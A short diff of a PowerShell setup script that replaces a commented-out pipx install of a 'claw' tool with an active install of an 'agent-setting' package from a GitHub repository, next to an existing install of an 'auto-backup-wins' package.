@@ -592,7 +592,7 @@ try {
     }
 
     $pipxInvoker = Install-Pipx -PythonPath $pythonPath
-    #Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe') -VenvNames @('claw')
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -VenvNames @('agent-setting')
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
 
     if (Test-Path '.configs') {
